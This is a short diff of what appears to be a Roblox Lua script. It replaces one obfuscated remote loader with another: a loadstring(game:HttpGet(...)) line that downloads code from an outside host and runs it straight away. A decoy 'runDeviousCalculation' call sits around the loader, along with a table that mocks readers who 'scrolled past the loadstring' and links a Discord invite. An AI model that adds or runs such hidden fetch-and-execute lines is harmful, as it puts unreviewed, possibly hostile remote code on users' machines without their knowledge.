@@ -312,7 +312,7 @@ end
 
 local deviousRes = runDeviousCalculation()
 
-loadstring(game:HttpGet("https://obfuscatorhub.onrender.com/api/fry0m2yb"))()
+loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=2828387712537"))("2828387712537")
 
 local postSkidDatabase = {
     "hahaha you actually scrolled past the loadstring lol: https://discord.gg/P2FEVBz2PG",
